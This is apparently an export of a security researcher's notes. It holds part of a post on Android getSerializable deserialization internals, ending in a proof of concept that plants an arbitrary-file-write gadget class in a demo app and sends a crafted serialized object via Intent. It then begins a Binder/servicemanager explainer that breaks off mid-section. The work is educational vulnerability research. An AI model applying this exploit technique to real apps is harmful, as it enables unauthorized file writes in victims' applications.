clazz, itemTypes);\n\t}\n\treturn object;\n}\n\n// Parcel::readValue\nprivate \u003cT\u003e T readValue(int type, @Nullable ClassLoader loader, @Nullable Class\u003cT\u003e clazz,\n\t\t@Nullable Class\u003c?\u003e... itemTypes) {\n\tfinal Object object;\n\tswitch (type) {\n\t\tcase VAL_NULL:\n\t\t\tobject = null;\n\t\t\tbreak;\n\t\t/* .. */\n\t\tcase VAL_STRING:\n\t\t\tobject = readString();\n\t\t\tbreak;\n\n\t\tcase VAL_BYTE:\n\t\t\tobject = readByte();\n\t\t\tbreak;\n\n\t\tcase VAL_SERIALIZABLE:\n\t\t\tobject = readSerializableInternal(loader, clazz);\n\t\t\tbreak;\n\t\t/* .. */\n\t\tdefault:\n\t\t\tint off = dataPosition() - 4;\n\t\t\tthrow new BadParcelableException(\n\t\t\t\t\"Parcel \" + this + \": Unmarshalling unknown type code \" + type\n\t\t\t\t\t\t+ \" at offset \" + off);\n\t}\n\t/* .. */\n\treturn (T) object;\n}\n\n```\n\nMost of the code is related to the unmarshalling process of Parcel objects and has been intentionally removed to focus on our main scope. The `loader` parameter that we were searching for seems to originate in the `Parcel::apply` [1] method. `mLoader`, in the `Parcel` context, is a class member of type `ClassLoader` and is defined in the `Parcel::LazyValue` constructor as the last parameter. The Lazy bundle mechanism is a \"newly\" (some years ago) introduced way to lazily deserialize parcels upon a prefixed length that has been well explained in the talk \"[Android Parcels: The Bad, the Good and the Better - Introducing Android's Safer Parcel](https://www.youtube.com/watch?v=qIzMKfOmIAA)\". \n\nBy dynamically hooking the `readSerializableInternal` using frida, the loader (of type `dalvik.system.PathClassLoader`) has the following value:\n```plain\ndalvik.system.PathClassLoader[DexPathList[[zip file \"/data/app/~~pSOjjaFofZg9BArMhAPO3w==/com.example.serialized.receiver-xCRsymIZLPj1E9xRk7LQpw==/base.apk\"],nativeLibraryDirectories=[/data/app/~~pSOjjaFofZg9BArMhAPO3w==/com.example.serialized.receiver-xCRsymIZLPj1E9xRk7LQpw==/lib/arm64, /system/lib64, /system_ext/lib64]]]\n```\n\nThe loader, of type `dalvik.system.PathClassLoader`,  is used to resolve passed objects and contains the following paths (`DexPathList`):\n- `/data/app/~~pSOjjaFofZg9BArMhAPO3w==/com.example.serialized.receiver-xCRsymIZLPj1E9xRk7LQpw==/base.apk`\n- `/data/app/~~pSOjjaFofZg9BArMhAPO3w==/com.example.serialized.receiver-xCRsymIZLPj1E9xRk7LQpw==/lib/arm64`\n- `/system/lib64`\n- `/system_ext/lib64`\n\nThe first two paths are application specific while the last two are system specific. First, pretty obvious, statement: input objects must be defined in the application or system context.\n\n#### Class resolution\nNow that we have a more understanding of both `loader` and `clazz` parameters, we can come back to the  `readSerializableInternal` source code shown above. If `clazz` is defined, `Class.forName` is used against the input class name from the parcel to return the `Class` object and verified with `isAssignableFrom` (and `BadTypeParcelableException` is thrown if it doesn't \"match\"). Since we are interested in the `getSerializable` surface without the explicit type casting, the `clazz` is null in these cases and the following code is executed:\n\n```java\nbyte[] serializedData = createByteArray();\nByteArrayInputStream bais = new ByteArrayInputStream(serializedData);\nObjectInputStream ois = new ObjectInputStream(bais) {\n\t@Override\n\tprotected Class\u003c?\u003e resolveClass(ObjectStreamClass osClass)\n\t\t\tthrows IOException, ClassNotFoundException {\n\t\t// try the custom classloader if provided\n\t\tif (loader != null) {\n\t\t\tClass\u003c?\u003e c = Class.forName(osClass.getName(), false, loader);\n\t\t\treturn Objects.requireNonNull(c);\n\t\t}\n\t\treturn super.resolveClass(osClass);\n\t}\n};\nT object = (T) ois.readObject();\n```\n\nA byte array is read from the parcel using `createByteArray` (`serializedData`) and used to initialize a [`ByteArrayInputStream`](https://developer.android.com/reference/java/io/ByteArrayInputStream) (`bais`) that is used to init [`ObjectInputStream`](https://developer.android.com/reference/java/io/ObjectInputStream) (`ois`) overriding the `resolveClass` method with a different logic if the `loader` is defined (our case).  The logic is however similar to the \"original\" [`resolveClass`](https://developer.android.com/reference/java/io/ObjectInputStream#resolveClass(java.io.ObjectStreamClass)) behavior, as mentioned in the [documentation](\u003chttps://developer.android.com/reference/java/io/ObjectInputStream#resolveClass(java.io.ObjectStreamClass)\u003e):\n\u003e The default implementation of this method inÂ `ObjectInputStream`Â returns the result of calling `Class.forName(desc.getName(), false, loader)`\n\n### `ObjectInputStream`\nThe [`ObjectInputStream`](\u003chttps://developer.android.com/reference/java/io/ObjectInputStream#resolveClass(java.io.ObjectStreamClass)\u003e) seems our next desired target to deep in. It is a [Java class object](https://docs.oracle.com/javase/8/docs/api/?java/io/ObjectInputStream.html) and we can extract few interesting statements from its official documentation:\n\u003e An ObjectInputStream ==deserializes primitive data and objects== previously written using an ObjectOutputStream. \n\n\u003e The methodÂ ==`readObject`Â is used to read an object from the stream==. Java's safe casting should be used to get the desired type.\n\n\u003e ==Reading an object is analogous to running the constructors== of a new object. \n\n\u003e The default deserialization mechanism for objects ==restores the contents of each field== to the value and type it had when it was written.\n\n\u003e Classes control how they are serialized by ==implementing== either the ==java.io.Serializable== or ==java.io.Externalizable== interfaces. ==Only objects== that support the java.io.Serializable or java.io.Externalizable interface can be read from streams.\n\nSince it's not an Android specific class, there are different online resources that have already covered the most out of it, especially this interesting talk back in 2016: [\"Java deserialization vulnerabilities - The forgotten bug class\" by Matthias Kaiser](https://www.youtube.com/watch?v=9Bw1urhk8zw). The key concept that we can summarize is that, in our case, the `resolveClass` method in  `ObjectInputStream` is overriden in order to use the \"custom\" class loader provided from the method parameter and that the deserialization process actually starts at [`ois.readObject`](https://cs.android.com/android/platform/superproject/main/+/main:libcore/ojluni/src/main/java/java/io/ObjectInputStream.java;l=420;drc=7f1a1070dbdd1bda00223be2f21936f63a8f3850).\n\n#### `ObjectInputStream::readObject`\nFinally we are at the core of the deserialization process and we can state that we are in a generic Java deserialization mechanism using the `ObjectInputStream::readObject` method. ~~My curiosity instinct tells me to go deeper far into the Java [Object Serialization Stream Protocol](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html) parsing process but the rational part reminds me to stay on the objective~~ (spoiler: I did it, partially). However, if you desire, you can go far deeper starting from [`ObjectInputStream::readObject`](https://cs.android.com/android/platform/superproject/main/+/main:libcore/ojluni/src/main/java/java/io/ObjectInputStream.java;l=420;drc=7f1a1070dbdd1bda00223be2f21936f63a8f3850) and [`ObjectInputStream::readObject0`](https://cs.android.com/android/platform/superproject/main/+/main:libcore/ojluni/src/main/java/java/io/ObjectInputStream.java;l=1389;drc=7f1a1070dbdd1bda00223be2f21936f63a8f3850).\n\n## Deserialization Summary\nThe code overview lead us to a pretty trivial conclusion: input objects are deserialized using the common Java `ObjectInputStream::readObject` mechanism and the class loader includes **application** and **system** specific paths. With that in mind, we are now aware that we are in a common Java deserialization scenario where we can instantiate system or application classes that implements the `java.io.Serialiazible` or ` java.io.Externalizable` interfaces. In order to create an impactful scenario, do we ~~**only**~~ need to find an useful gadget?\n\n## All you need is a good gadget, right?\nInstantiate a system object is pretty straightforward: you import the appropriate module and create the object from there. The same apply for third-party library objects, you regularly import them and you can use the exported classes. However, what if we want to target a specific class from a specific application? In this specific case, things are a little bit different.\n\n### Application specific gadgets\nIn order to properly instantiate a target application object into another application it is possible to use dynamic code loading and reflection. First, after having identified the target object, it is necessary to extract the respective `classesN.dex` file and store it in the application resources of the attacker application (or in any other desired way). It is possible to identify the appropriate dex file by reverse engineering the target application with `jadx-gui` , where the filename is displayed in the reversed Java code. Then, with `apktool` it is possible to directly extract it (`apktool --no-src d app.apk`).\n\n```java\nFile dexFile = getFileFromRaw(R.raw.classes4, \"classes_out.dex\");\nDexClassLoader dexClassLoader = new DexClassLoader(dexFile.getAbsolutePath(), null, null, null); // [1]\n\nloadedClass = dexClassLoader.loadClass(\"com.example.serialized.receiver.CustomClass\"); // [2]\nobj = loadedClass.newInstance(); // [3]\n\nField f_att1;\nf_att1 = loadedClass.getDeclaredField(\"att1\") // [4]\nf_att1.setAccessible(true);\nf_att1.set(obj, 1337); // [5]\n\nIntent in = new Intent();\n\nin.putExtra(\"so\", (Serializable) obj); // [6]\nstartActivity(in);\n```\n\nThe code above shows how it is then possible to import the `classes.dex` file and instantiate a `DexClassLoader` [1] from it. The returned `ClassLoader` can be used to load the class [2] and subsequently instantiate the object through the `Object.newInstance()` method [3]. Class fields can be accessed and modified through the loaded class using the `getDeclaredField`  method [4]  and `Field.set` [5]. At the end of everything, it is just necessary to cast the input object to `Serializable` [6] in order to accomodate the `Intent.putExtra` logic.\n\nOf course, this is not the only way to achieve this result, stealthier in-memory solutions or completely different alternatives (e.g. raw object bytes) might be possible as well but are not in the interest of this blog post.\n\n### Internal deserialization process\nOnce the object is received from the target application through IPC, the deserialized object is a just a series of bytes (a bunch of 0s and 1s that need to be interpreted, as everything in computer science) and the previously mentioned [`ObjectInputStream::readFile0`](https://cs.android.com/android/platform/superproject/main/+/main:libcore/ojluni/src/main/java/java/io/ObjectInputStream.java;l=1389;drc=7f1a1070dbdd1bda00223be2f21936f63a8f3850) is responsible for that, following the Java [Object Serialization Stream Protocol](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html) specification. As we have said, we are not going to deepen this process, but there are a few interesting things that are in our interest:\n\n```java\n  private Object readObject0(boolean unshared) throws IOException {\n        // ..\n        byte tc;\n        while ((tc = bin.peekByte()) == TC_RESET) {\n            // .. \n        }\n        try {\n            switch (tc) {\n                case TC_ENUM:\n                    return checkResolve(readEnum(unshared)); \n                case TC_OBJECT:\n                    return checkResolve(readOrdinaryObject(unshared)); // [1]\n                // ..\n                }\n\t\t\t}\n\t\t// ..\n    }\n    private Object readOrdinaryObject(boolean unshared)\n        throws IOException\n    {\n        ObjectStreamClass desc = readClassDesc(false);\n\n        Class\u003c?\u003e cl = desc.forClass();\n        if (cl == String.class || cl == Class.class\n                || cl == ObjectStreamClass.class) {\n            throw new InvalidClassException(\"invalid class descriptor\");\n        }\n        Object obj;\n        \n        try {\n            obj = desc.isInstantiable() ? desc.newInstance() : null; // [3]\n        } catch (Exception ex) {\n            throw (IOException) new InvalidClassException(\n                desc.forClass().getName(),\n                \"unable to create instance\").initCause(ex);\n        }\n        // ..\n        Object obj;\n        final boolean isRecord = desc.isRecord();\n        if (isRecord) { // [2]\n            assert obj == null;\n            obj = readRecord(desc);\n            if (!unshared)\n                handles.setObject(passHandle, obj);\n        } else if (desc.isExternalizable()) {\n            readExternalData((Externalizable) obj, desc);\n        } else {\n            readSerialData(obj, desc);\n        }\n\n        handles.finish(passHandle);\n\n        if (obj != null \u0026\u0026\n            handles.lookupException(passHandle) == null \u0026\u0026\n            desc.hasReadResolveMethod())\n        {\n            Object rep = desc.invokeReadResolve(obj);\n        }\n        return obj;\n    }\n```\n\nIf the byte stream contains an object (`TC_OBJECT`), [`readOrdinaryObject`](https://cs.android.com/android/platform/superproject/main/+/main:libcore/ojluni/src/main/java/java/io/ObjectInputStream.java;l=1895;drc=7f1a1070dbdd1bda00223be2f21936f63a8f3850) [2] is called and, after some validation steps, the object is instantiated through the the `.newInstance` method based on its type. The `.isInstantiable` is a good starting point to understand the logic behind the constructor selection:\n\n```java\nboolean isInstantiable() {\n\trequireInitialized();\n\treturn (cons != null); //[1]\n}\n\nprivate ObjectStreamClass(final Class\u003c?\u003e cl) {\n    // ..\n        } else if (externalizable) {\n            cons = getExternalizableConstructor(cl); // [2]\n        } else {\n            cons = getSerializableConstructor(cl); // [3]\n    // ..\n}\n\nprivate static Constructor\u003c?\u003e getExternalizableConstructor(Class\u003c?\u003e cl) {\n    // ..\n    Constructor\u003c?\u003e cons = cl.getDeclaredConstructor((Class\u003c?\u003e[]) null); // [4]\n    cons.setAccessible(true);\n    // ..\n    return ((cons.getModifiers() \u0026 Modifier.PUBLIC) != 0) ? cons : null;\n}\n\nprivate static Constructor\u003c?\u003e getSerializableConstructor(Class\u003c?\u003e cl) {\n    Class\u003c?\u003e initCl = cl;\n    // ..\n    Constructor\u003c?\u003e cons = initCl.getDeclaredConstructor((Class\u003c?\u003e[]) null); // [5]\n    int mods = cons.getModifiers();\n    if ((mods \u0026 Modifier.PRIVATE) != 0 || ((mods \u0026 (Modifier.PUBLIC | Modifier.PROTECTED)) == 0 \u0026\u0026 !packageEquals(cl, initCl)))\n    {\n        return null;\n    }\n    // ..\n    cons.setAccessible(true);\n    return cons;\n}\n\n```\n\nIf we search for write references (from cs.android.com) to the `cons` variable [1], we can identify its definition in the `ObjectStreamClass` constructor [2][3]. Both \n`Externalizable` and `Serializable` interfaces are instantiated through a `public` (or also `protected` in case of `Serializable`) no-arg constructors [4][5]. In case of `Serializable` however, the returned constructor is the first non-serializable superclass.\n\nGoing back to the `readOrdinaryObject` shown above, an if/else condition dispatch the parsing method based on the received object class type.\n\n#### `readSerialData`\nStarting from the already known `Serializable` interface, let's see a trimmed version of the code responsible to handle this type of objects from the [`ObjectInputStream::readSerialData`](https://cs.android.com/android/platform/superproject/main/+/main:libcore/ojluni/src/main/java/java/io/ObjectInputStream.java;l=2063;drc=60545d5caebd2d51949000994964458249a234c3) method:\n\n```java\nprivate void readSerialData(Object obj, ObjectStreamClass desc) throws IOException        \n    {\n        ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout(); // [1]\n        for (int i = 0; i \u003c slots.length; i++) {\n            ObjectStreamClass slotDesc = slots[i].desc;\n            if (slots[i].hasData) {\n                if (obj == null || handles.lookupException(passHandle) != null) {\n                    defaultReadFields(null, slotDesc);\n                } else if (slotDesc.hasReadObjectMethod()) {\n\n                    slotDesc.invokeReadObject(obj, this); // [1]\n                } else {\n                    defaultReadFields(obj, slotDesc);\n                }\n            } else {\n                if (/* .. */ \u0026\u0026 slotDesc.hasReadObjectNoDataMethod())\n                {\n                    slotDesc.invokeReadObjectNoData(obj); // [2]\n                }\n            }\n        }\n    }\n    \nvoid invokeReadObject(Object obj, ObjectInputStream in) throws ClassNotFoundException, IOException, UnsupportedOperationException\n\t{\n\t\tif (readObjectMethod != null) {\n\t\t\t// ..\n\t\t\treadObjectMethod.invoke(obj, new Object[]{ in }); //[3]\n\t\t\t// ..\n\t}\n```\n\nThe object needs to be deserialized from the superclass to subclasses, hence these are obtained through `getClassDataLayout` [1] and looped. Inside the `for` loop we can identify two interesting invocations: `.invokeReadObject` [1] and `.invokeReadObjectNoData` [2]. These two methods are responsible to call the respective `readObject` or `readObjectNoData` methods **if** they are defined in the serialized class through reflection [3].\n\n#### `readExternalData`\nThe `readExternalData` method is instead responsible to handle [`Externalizable`](https://developer.android.com/reference/java/io/Externalizable) interfaces:\n\n```java\nprivate void readExternalData(Externalizable obj, ObjectStreamClass desc) throws IOException\n    {\n\t    // ..\n        try {\n            if (obj != null) {\n                try {\n                    obj.readExternal(this);\n                } catch (ClassNotFoundException ex) {\n                    // ..\n                }\n            }\n        }\n    }\n```\n\nInstead of calling `readObject` or `readObjectNoData`, the `readExternal` method is called directly from the `obj` itself. In this case, the `readExternal` implementation is mandatory and class-specific while the `Serializable` is just a mark interface.\n\n#### `readRecord`\nThe `readRecord` method is instead responsible to parse record types. Since records are immutable and data-focused classes, they are not in our intereset and, for that reason, we are going to skip its parsing.\n\n### Transient and not Serializable classes\nThere are classes, typically related to system resources (socket, streams, threads, ..) or OS and runtime specific, that are not serializable and can be declared with the [`transient`](https://www.w3schools.com/java/ref_keyword_transient.asp) keyword. The [`transient`](https://www.w3schools.com/java/ref_keyword_transient.asp) prevents attributes from being deserialized and has been particularly used to prevent issues related to escalate java deserialization to C++ memory corruption primitives through unprotected `long` pointers ([One class to rule them all: 0-day deserialization vulnerabilities in Android](https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf) and [Android Deserialization Vulnerabilities: A Brief history](https://securitylab.github.com/resources/android-deserialization-vulnerabilities/)).\nIf an attribute object that is not serializable (e.g. does not `implements` the `Serializable` mark interface), is not marked as `transient` and is part of a `Serializable` class, it will trigger a `java.io.NotSerializableException` inside `Parcel::writeObject0` only if the not serializable attribute is set from the sender side. Otherwise, the receving part will just receive `null`. \n\n## Proof-Of-Concept\n### Scenario\nLet's build an application Proof Of Concept that takes a Serializable object through `getIntent().getSerializible()` and casts it to a really generic type (e.g. `Activity`). Also, the application contains the following vulnerable class that implements a `readObject` that permits to write an arbitrary file with arbitrary content. The class is `Serializable` and never used across the application (*You can also note the not serializable `ComponentName` attribute*):\n```java\npackage com.example.serialized.receiver;\n\nimport android.content.ComponentName;\nimport android.util.Log;\n\nimport java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\nimport java.io.Serializable;\n\npublic class CustomTargetClass implements Serializable {\n    String filename;\n    String content;\n    ComponentName cn;\n\n    static {\n        // init\n        Log.d(\"SS\", \"CustomTargetClass::init\");\n    }\n\n    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {\n        in.defaultReadObject();\n        \n        Log.d(\"SS\", \"CustomTargetClass::readObject\");\n        FileWriter fileWriter;\n        File file = new File(filename);\n        fileWriter = new FileWriter(file);\n        fileWriter.write(content);\n        fileWriter.close();\n        Log.d(\"SS\", \"File written\");\n    }\n}\n```\n\nThe receiver exported activity contains the following code:\n```java\npublic class SerialReceiver extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_serial_receiver);\n        Intent in = getIntent();\n        Activity so = (Activity) in.getSerializableExtra(\"so\");\n    }\n}\n```\n\n### Exploitation\nFollowing what has been previously described in the \"Application specific gadgets\" chapter, we can extract the `classesN.dex` where our target object (`com.example.serialized.receiver.CustomTargetClass`) is defined and import it into our application. This task is easily feasible with a combination of `jadx-gui` and `apktool`. From `jadx-gui` we can see that the class `com.example.serialized.receiver.CustomTargetClass` is defined in `classes4.dex` (from the below comment \"loaded from\"):\n\n```java\npackage com.example.serialized.receiver;\n\nimport android.content.ComponentName;\nimport android.util.Log;\nimport java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\nimport java.io.Serializable;\n\n/* loaded from: classes4.dex */\npublic class CustomTargetClass implements Serializable {\n    /* .. */\n}\n```\n\nWith `apktool --no-src d app.apk` we can than extract the `classes4.dex` file and import into our target application (inside `res/raw`). \nAfter that, we can dynamically load the class and set `filename` and `content` with arbitrary values:\n\n```java\n\nClass\u003c?\u003e loadedClass;\nObject obj;\n\nFile dexFile = getFileFromRaw(R.raw.classes4_target, \"classes_temp_out.dex\");\nDexClassLoader dexClassLoader = new DexClassLoader(\n        dexFile.getAbsolutePath(),          // Path to the DEX file\n        null,                               // Deprecated since API 26\n        null,                               // No native library search path\n        null  \t\t\t\t\t\t\t\t// Parent class loader\n);\n\ntry {\n    loadedClass = dexClassLoader.loadClass(\"com.example.serialized.receiver.CustomTargetClass\");\n} catch (ClassNotFoundException e) {\n    throw new RuntimeException(e);\n}\n\ntry {\n    obj = loadedClass.newInstance();\n} catch (IllegalAccessException | InstantiationException e) {\n    throw new RuntimeException(e);\n}\n\n// Setting filename and content\nField f_att;\ntry {\n    f_att = loadedClass.getDeclaredField(\"filename\");\n    f_att.setAccessible(true);\n    f_att.set(obj, \"/data/data/com.example.serialized.receiver/pwn.txt\");\n\n    f_att = loadedClass.getDeclaredField(\"content\");\n    f_att.setAccessible(true);\n    f_att.set(obj, \"ARE YOU SERI-ALAZABLE?\\n\");\n} catch (NoSuchFieldException | IllegalAccessException e) {\n    throw new RuntimeException(e);\n}\n\n// Sending intent\nIntent in = new Intent();\nComponentName cn = new ComponentName(\"com.example.serialized.receiver\", \"com.example.serialized.receiver.SerialReceiver\");\nin.setComponent(cn);\n\nin.putExtra(\"so\", (Serializable) obj);\nstartActivity(in);\n\n```\n\nAnd the result is ...\n\n![[notes/images/deserial/des-poc.png]]\n\n## Conclusion\nIn this blog post we deep dived into the deserialization mechanism of the critical and common `getSerializable` API showcasing its internals, from a source code point of view, and demonstrating its potential security impact.\n\n## References\n- https://developer.android.com\n- [Android parcels: the bad, the good and the better](https://www.youtube.com/watch?v=qIzMKfOmIAA\u0026t=1190s)\n- https://github.com/michalbednarski/ReparcelBug2\n- https://github.com/michalbednarski/LeakValue?tab=readme-ov-file\n- [RuhrSec 2016: \"Java deserialization vulnerabilities - The forgotten bug class\", Matthias Kaiser](https://www.youtube.com/watch?v=9Bw1urhk8zw)\n- https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html\n- [What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)\n- [One class to rule them all: 0-day deserialization vulnerabilities in Android](https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf)\n- [Android Deserialization Vulnerabilities: A Brief history](https://securitylab.github.com/resources/android-deserialization-vulnerabilities/)","lastmodified":"2025-04-14T14:14:33.954126369Z","tags":null},"/notes/Android-Internals-IPC-Binder-and-Service-Manager-Perspective":{"title":"Android Internals IPC: Binder and Service Manager Perspective","content":"\n## Introduction\nAs mentioned in the previous article, Android uses the Binder for IPC communications. Good to know, the Binder was not created by Google. Its initial appearance was in BeOS, an old OS for mobile devices. After some acquisitions, original developers joined Android and took the Binder with them. The OpenBinder porting to Android was more implementation specific and it is a key component of the current Android OS. The official OpenBinder website is not up anymore, but there are some mirrors like [this one](http://www.angryredplanet.com/~hackbod/openbinder/docs/html/) that contain precious documentation. \n\n## High level overview\nBinder is a kernel module written in C, mainly responsible to let processes securely, transparently and easily communicate with each other using a client-server architecture. The simplicity on how processes can interact together is awful, a client application just needs to call a method provided by the service (that is the server in the client-side architecture) and everything in between is handled by the Binder. With â€˜everything in betweenâ€™ I mean **location**, **delivery** and **credentials**.\n\nWhen a client needs to interact with a service, he needs to locate the target service (that is, in fact, the target process). The binder is responsible to locate the service, handle the communication, deliver the messages and check for caller privileges (credentials).**The location stage is handled by the servicemanager** that acts as the endpoint mapper, it maintains a service directory that maps an interface name to a Binder handle. So, when the Binder receives a request for a specific service, it asks to the servicemanager. The servicemanager returns a handle to the binder after some permission checks (for example the` AID_ISOLATED` mentioned in the first part) scrolling on its service list (aka service directory). If the client has permissions to interact with the requested service, the Binder will proxy the communication and deliver the message to the server, that will elaborate the request and return the result to the Binder, that will redirect it to the client as a \"message\". These messages are technically called \"Parcels\", containers that are written from both client and server in order to communicate with a serialization mechanism (parameters, return values, ..).\n\n![img1](/notes/images/android/2/1.png)\n\n## Binder Introduction\n\nLet's start with the main component of an IPC transaction, the Binder. As we said, the Binder is a small kernel module that lives in the kernel and acts as a messenger for clients and services. Every operation in Android goes through the Binder, and that's why two researchers, Nitay Artenstein and Idam Revivo, took an interesting talk at BH2014: [Man in the Binder: He Who Controls IPC, Controls the Droid](https://www.youtube.com/watch?v=O-UHvFjxwZ8\u0026t=418s).\n\nThis research demonstrates an advanced post exploitation technique (a rootkit implant) where it is possible to sniff every data that uses IPC, in order to manipulate network traffic and sensitive information by hooking binder calls.\n\nThe character device at `/dev/binder` is read/write by everyone, any process can perform read and write operations on it using `ioctl()` calls. The `ioctl()` responsible to handle the IPC connection from clients (applications) is located in the *'libbinder.so'* shared library, that is loaded in each application process. This library is responsible for the client initialization phase, setting up messages (aka Parcel) and talking with the binder driver. We will deepen this specific library while talking, in next chapters, about the client and service implementations.\n\n## Binder interactions (userland -\u003e kerneland)\n\nFirst to introduce more concepts, let's first take an introduction on how a basic interaction works from userland to kerneland, from a client (or a service) to the binder kernel module. As a linux based OS, the `ioctl` system call is used to talk with the kernel module using the special character file `/dev/binder`. The driver accepts different request codes:\n- `BINDER_SET_MAX_THREAD`: Limit thread numbers of a thread pool.\n- `BINDER_SET_CONTEXT_MGR`: Set the context manager (the service manager).\n- `BINDER_THREAD_EXIT`: A thread exit the thread pool.\n- `BINDER_VERSION`: Get the Binder version.\n- `BINDER_WRITE_READ`: The most executed request code responsible for all client and service requests.\n\nWe will deepen all commands during these articles, but let's start with the `BINDER_WRITE_READ` request code.The binder module source code is at `drivers/android/binder.c`, here the `binder_ioctl()` is responsible to dispatch requests received from userland based on above request codes. In the case of a `BINDER_WRITE_READ` code, the `binder_ioctl_write_read()` is triggered and parameters are handled from userland to kerneland (and vice versa) using the `binder_write_read` structure:\n\n```CPP\nstruct binder_write_read {\n\tsigned long write_size;  // size of buffer by the client\n\tsigned long write_consumed;  // size of buffer by the binder\n\tunsigned long   write_buffer;\n\tsigned long read_size;  // size of buffer by the client\n\tsigned long read_consumed;  // size of buffer by the binder\n\tunsigned long   read_buffer;\n};\n```\n\nIn this structure, we have 2 main divisions: **write and read items**. Write items (`write_size`, `write_consumed`, `write_buffer`) are used to send commands to the binder that it has to execute, meanwhile read items contain transactions from the binder to the clients that they have to execute (the ones that `ioctl` the binder).\n\nFor example, if a client needs to talk to a service, it will send a `binder_write_read` command with write items filled. When binder replies back, the client will have read items filled back. The same, a service waiting for client interactions, will receive transactions from the binder with read items.\n\nWhile talking about \"clients\", I donâ€™t mean only application clients that need to perform a request in an IPC context. A client, in this context, is a process that `ioctl()` the binder. For example, a service waiting for transactions from an application is a client of the binder, because it calls `ioctl()` in order to receive actions.\n\n![img2](/notes/images/android/2/2.png)\n\nNote that in the case of a client, the `ioctl` is performed when it is needed from the application (for example to perform an Inter Process Communication). Meanwhile, the service process has threads waiting in a loop for transactions from the binder.\n\nInside these read and write attributes we have more commands, that starts with `BC_` and `BR_`. The difference is in the way that the transaction is going, to or from the Binder. **`BR`** are commands **received FROM the binder**, while **BC** are commands **SENT to the binder**. To remind me about this difference, I think of them as they are \"**B**inder**C**all\" (BC) and \"**B**inder**R**eceive\" (BR), but I don't think they are the official acronyms.\n\nAn example of a generic command that applies to both types of interactions is \"TRANSACTION\". we can have `BC_TRANSACTION` and `BR_TRANSACTION`. `BC_TRANSACTION` is used from clients to binder, while `BR_TRANSACTION` is used from the binder to its clients.\n\n### The servicemanager\nAs was illustrated in the High Level overview, the servicemanager is responsible for the **location stage**. When a client needs to interact with a service (using the Binder), the Binder will ask the servicemanager for a handle to that service.\n\nThe servicemanager source code is located at `frameworks/native/cmds/servicemanager/`, where `service_manager.c` is responsible to initialize itself and handle service related requests. Meanwhile, in `binder.c` (inside that path, not the kernel module) we find the code responsible to handle the communication with the binder, parsing received requests from it and sending the appropriate replies. \n\nServicemanager is started at boot time as defined in `/init.rc` file. This init file is part of the boot image and is responsible to load system partitions and binaries in the boot process:\n\n```javascript\n    /.../\n    # start essential services\n    start logd\n    start servicemanager\n    start hwservicemanager\n    start vndservicemanager\n    /.../\n\n  # When servicemanager goes down, restart all specified services\n    service servicemanager /system/bin/servicemanager\n    class core\n    user system\n    group system\n    critical\n    onrestart restart healthd\n    onrestart restart zygote\n    onrestart restart media\n    onrestart restart surfaceflinger\n    onrestart restart drm\n    onrestart restart perfhub\n    /.../\n```\n\nWhen the service manager is started, the `main` function obtains a handle to the binder (`/dev/binder`) and successively call `binder_become_context_manager()` that will `ioctl` the binder with the `BINDER_SET_CONTEXT_MGR` command, in order to declare itself as the context manager.\n\nThe **context manager** is crucial for the binder as it serves as the service locator. When the binder needs to locate a service, it asks for a handle to its context manager .Once the registration with the binder it's done, it calls `binder_loop` (from `binder.c`) with a callback function parameter. This callback (`svcmgr_handler`) will be responsible to handle service related requests.\n\nThe `binder_loop` responsibility, as the name suggests, is to start an infinite loop that will receive requests from the binder. Before this loop, it will call the binder with `BC_ENTER_LOOPER` to inform the binder that a specific thread is joining the thread pool. The **thread pool** is a group of threads that are waiting for incoming messages from the binder, usually services have multiple threads in order to handle multiple requests. By the way, the service manager is a single-threaded service, so this is the first and unique thread. \n\nAfter this notification, the servicemanager starts its infinite loop that continuously calls the binder through `ioctl` waiting for actions. This is managed using the `BINDER_WRITE_READ` command (to the binder) with a `binder_write_read` structure that will be filled by the binder in its `read_*` items, this is the already mentioned structure:\n\n```cpp\nstruct binder_write_read {\n\tsigned long write_size;  // size of buffer by the client\n\tsigned long write_consumed;  // size of buffer by the binder\n\tunsigned long   write_buffer;\n\tsigned long read_size;  // size of buffer by the client\n\tsigned long read_consumed;  // size of buffer by the binder\n\tunsigned long   read_buffer;\n};\n```\n\nWhen the binder needs the service manager to perform an action (e.g. getting a handle to a service) it will return to the `binder_loop()` a `binder_write_read` structure with `read_buffer` filled with the requested transaction (and in `read_consumed` its actual size). These two values are passed over the `binder_parse` function that starts to deserialize the transaction request:\n\n```cpp\n  /* .. */\n\tuintptr_t end = ptr + (uintptr_t) size; // end calculated using the bwr.read_consumed\n\twhile (ptr \u003c end) {\n\t\tuint32_t cmd = *(uint32_t *) ptr; // the command is read from the buffer\n\t\tptr += sizeof(uint32_t);\n\t// switch case on the received command\n\tswitch(cmd) {\n\t\tcase BR_NOOP:\n\t\t\tbreak;\n\t/* .. */\n```\n\nThe first 32 bits of the `bwr.read_buffer` contains the command to be executed (`cmd`). There is a huge list of handled commands: `BR_NOOP`, `BR_TRANSACTION_COMPLETE`, `BR_INCREFS` - `BR_ACQUIRE` - `BR_RELEASE`, `BR_DECREFS`, `BR_DEAD_BINDER`, `BR_FAILED_REPLY` - `BR_DEAD_REPLY`, `BR_TRANSACTION`, `BR_REPLY`.\n\nYou can find a lot more `BR_*` commands, but these are the only ones handled by the servicemanager. For example, a normal service can receive a `SPAWN_LOOPER` command from the binder, that requests the service to spawn a new thread in order to handle more requests. We said that the servicemanager is single thread, so there is no sense to receive this type of requests, so they are not handled. We will better deepen on these commands that are used by other services in `IPCThreadState.cpp` in next articles.\n\nAfter having extracted the command from the `binder_read_write` structure, this one is inserted in a switch case where above commands are managed. The most interesting one is the `BR_TRANSACTION` because it means that the binder needs to retrieve a service handle or register a new service.\n\n### 